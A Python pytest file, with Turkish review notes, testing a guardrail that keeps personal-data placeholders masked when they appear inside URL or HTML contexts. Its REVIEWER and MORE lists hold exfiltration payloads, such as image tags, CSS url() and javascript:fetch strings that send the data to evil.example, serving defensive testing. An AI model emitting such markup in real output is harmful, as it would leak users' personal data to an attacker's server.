"""08-tam-1a r3 MAJOR-r3-1 (KARARLAR "C17 URL bağlam kuralı, ek" (a), (b)): the marker list was
respelled around again (`src` and `=` on two lines, `style="…url(`, `<object data=`, `http:` without
`//`). A URL scheme with its colon, `style=`, `data=` and `url(` are line markers; since r4 any
HTML tag (`<` and a letter; a whole placeholder is not one) keeps the rest of the reader's stream
(KARARLAR "C17 geri çevirme: cevap düzeyinde HTML fail-closed"), so the multi-line tag cases
below are kept by that rule, not by following tags or attribute names. The reviewer's four
writings (state/evidence/08t1a-r3-adversarial-check.log) and the r2 table stay negative on every
reading form."""

import asyncio

import pytest

from ffcore.guardrails.masking import (
    ContextReveal,
    PlaceholderAligner,
    StreamDetokenizer,
    detokenize_json,
    reveal_text,
)
from tests.unit.test_08t_c17_masking import _store_with
from tests.unit.test_08t_r2_url_lines import BYPASSES

run = asyncio.run
NAME = "Ayşe Kaya"

REVIEWER = [
    '<img src\n="http:evil.example/?q=<<PII_1>>">',
    '<img src\n=\n"http:evil.example/?q=<<PII_1>>">',
    '<span style="background:url(http:evil.example/?q=<<PII_1>>)">',
    '<object data="http:evil.example/?q=<<PII_1>>">',
]
MORE = [
    '<img\nsrc\n=\n"x <<PII_1>>">',  # a tag over lines (kept: HTML, per stream)
    '<img alt=">" src\n=x<<PII_1>>>',  # the tag closed early (kept: HTML, per stream)
    "http:evil.example/?q=<<PII_1>>",
    "Bkz. HTTPS:evil.example/<<PII_1>>",
    "javascript:fetch('x'+'<<PII_1>>')",
    "data:text/html,<<PII_1>>",
    "a { background: url(<<PII_1>>) }",
    "<<img src=x?<<PII_1>>>",
    "<p>Sahibi <<PII_1>></p>",
]
WRITINGS = REVIEWER + MORE + BYPASSES


def _pieces(text, size):
    return [text[i : i + size] for i in range(0, len(text), size)]


def _read(text, form, size=3):
    store, _ = _store_with([NAME])

    async def go():
        if form == "text":
            return (await reveal_text(text, store=store, scope="run-1"))[0]
        if form == "json":
            return (await detokenize_json({"t": text}, store=store, scope="run-1"))[0]["t"]
        if form == "stream":
            sd = StreamDetokenizer(store, "run-1")
            out = [await sd.feed(p) for p in _pieces(text, size)]
            return "".join(out) + await sd.flush()
        cr = ContextReveal(store, "run-1")
        # the console reads entries the writer aligned (whole placeholders)
        aligner = PlaceholderAligner()
        aligned = [aligner.feed(p) for p in _pieces(text, size)] + [aligner.flush()]
        return "".join([(await cr.data({"text": p}, stream_text=True))["text"] for p in aligned])

    return run(go())


@pytest.mark.parametrize("form", ["text", "json", "stream", "console"])
@pytest.mark.parametrize("text", WRITINGS)
def test_08t_r3_url_rules_keep_the_placeholder(text, form):
    assert NAME not in _read(text, form)


@pytest.mark.parametrize("form", ["text", "stream", "console"])
@pytest.mark.parametrize(
    "text",
    [
        "Sahibi <<PII_1>>.",
        "<<PII_1>>",
        "a < b ve <<PII_1>>",
        "Sözleşme 3:5 maddesi, sahibi <<PII_1>>",
    ],
)
def test_08t_r3_lines_without_a_rule_are_reversed(text, form):
    assert NAME in _read(text, form, size=200)
